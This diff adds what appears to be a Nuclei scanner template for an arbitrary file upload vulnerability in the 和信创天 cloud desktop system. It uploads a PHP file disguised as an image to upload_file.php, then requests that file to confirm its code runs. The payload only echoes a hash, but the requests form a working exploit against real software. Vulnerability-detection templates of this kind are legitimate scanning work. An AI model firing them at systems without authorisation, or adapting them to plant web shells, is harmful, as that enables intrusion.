@@ -1,0 +1,51 @@
+id: poc-yaml-hxct-cloud-desktop-system-upload-file-php-upload-anyfile
+info:
+  name: 和信创天云桌面系统 upload_file.php 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t1: "{{rand_int(1,100)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Upload/upload_file.php?l=1"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv"
+    body: |
+      ------WebKitFormBoundaryfcKRltGv
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+      Content-Type: image/avif
+
+      <?php echo {{t2}};?>
+      ------WebKitFormBoundaryfcKRltGv--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "_Requst:<br>"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/Upload/1/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
